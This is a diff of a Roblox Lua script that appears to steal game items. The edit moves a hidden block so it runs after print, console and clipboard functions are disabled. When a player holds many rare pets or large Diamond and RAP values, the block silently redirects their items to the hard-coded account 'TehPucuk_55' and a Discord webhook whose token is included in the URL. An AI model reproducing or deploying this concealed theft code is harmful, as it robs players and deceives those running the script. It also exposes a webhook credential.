@@ -2,20 +2,6 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
-local savedPets = Library.Save.Get().Pets
-hugeamount = 0
-for i,v in pairs(Library.Save.Get().Pets) do
-    local Pet = Library.Directory.Pets[v.id]
-        if Pet.huge == true then
-        hugeamount = hugeamount + 1
-        print(v)
-    end
-end
-if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
-end
-
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -54,6 +40,20 @@ rconsoleinput = antiPrint
 printconsole = antiPrint
 setclipboard = antiPrint
 
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
+end
+
 -- Users And Stuff
 
 if UserName == nil then
@@ -78,14 +78,14 @@ if UserName == nil then
     return;
 end
 local worked2 = pcall(function()
-    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+    game:GetService("Players"):GetUserIdFromNameAsync("TehPucuk_55")
 end)
 if not worked2 then
     game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
     return;
 end
 if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync("TehPucuk_55")
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
